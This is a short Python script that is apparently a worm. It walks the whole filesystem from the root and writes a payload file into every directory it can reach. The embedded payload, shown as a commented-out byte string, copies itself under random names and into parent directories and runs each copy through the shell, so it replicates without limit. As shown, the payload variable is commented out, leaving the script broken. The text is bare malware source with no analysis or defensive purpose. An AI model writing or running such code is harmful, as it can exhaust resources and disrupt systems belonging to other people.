import os
import random

random.seed()

os.chdir('/')

# WORM_BIN = b'from subprocess import run\r\nimport shutil\r\nfrom random import seed, randint\r\n\r\n# Initialise random library\r\nseed()\r\n\r\n# Create a version of itself\r\nfile_name = "worm"+str(randint(2, 5000))+".py"\r\nshutil.copy(__file__, file_name)\r\nrun((file_name), shell=True)\r\n\r\n# Adopt worm1.py name\r\nshutil.copy(__file__, "../")\r\nrun(("worm1.py"), shell=True, cwd="../")'

def traverse(path):
    with os.scandir(path) as scanner:
        try:
            with open(path+"\worm1.py", "wb") as outfile:
                outfile.write(WORM_BIN)
        except PermissionError:
            pass

        if scanner:
            directories = [entry for entry in scanner if entry.is_dir()]

            if directories:
                for entry in directories:
                    try:      
                        traverse(entry.path)
                
                    except PermissionError:
                        continue
    return

traverse(os.getcwd())